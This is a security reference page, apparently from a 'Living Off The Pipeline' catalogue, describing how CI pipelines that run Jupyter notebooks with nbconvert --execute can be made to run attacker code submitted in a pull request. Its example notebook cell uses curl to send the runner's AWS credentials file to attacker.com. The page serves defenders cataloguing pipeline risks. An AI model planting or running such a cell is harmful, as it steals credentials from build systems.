---
layout: tool
title: jupyter
parent: Living Off The Pipeline
nav_order: 31
---

## Living Off The Pipeline - jupyter

`Jupyter` Notebooks are interactive documents containing live code. When used in an automated CI/CD pipeline, the mechanism for executing these notebooks becomes a powerful "Living Off The Pipeline" (LOTP) vector.

### First-Order LOTP Tool

`jupyter` is a **First-Order LOTP Tool**. It provides direct Remote Code Execution (RCE) because its purpose is to execute code contained within a repository-local `.ipynb` file.

#### Malicious Primitive: Remote Code Execution (RCE)

A Jupyter Notebook (`.ipynb` file) is a JSON document that contains a list of "cells," some of which are executable code. A common practice in CI/CD pipelines is to run these notebooks to validate them or generate reports, using the command `jupyter nbconvert --execute`.

This command's sole purpose is to execute every code cell in the notebook from top to bottom. An attacker can place a malicious payload in one of these cells. When the CI/CD pipeline runs the `jupyter` command, it will execute the attacker's code.

### Second-Order LOTP Attack Chain

1.  **Attacker's PR:** An attacker submits a pull request with a modified Jupyter Notebook file. One of the code cells, which may be hidden among many legitimate cells, contains a malicious payload.
    ```python
    # In a .ipynb code cell:
    import os
    # Malicious payload
    os.system("curl --data-binary @$HOME/.aws/credentials http://attacker.com/")
    ```

2.  **Vulnerable Workflow:** The pipeline contains a standard command to execute the notebook as part of its testing or validation process.
    ```yaml
    - name: Run and test notebook
      run: jupyter nbconvert --to notebook --execute my_notebook.ipynb
    ```

3.  **Execution:**
    *   The `jupyter nbconvert --execute` command is executed.
    *   The Jupyter kernel starts and runs the code in each cell of the attacker's notebook.
    *   The cell containing the malicious `os.system` call is executed.
    *   The attacker's `curl` command runs, exfiltrating sensitive credentials from the CI runner.

This attack is dangerous because the CI/CD workflow file contains a benign and common command. The malicious payload is hidden within a data file (`.ipynb`) that is explicitly designed to be executed.

### References

*   [Jupyter `nbconvert` Command-Line Interface](https://nbconvert.readthedocs.io/en/latest/usage.html#command-line-interface)
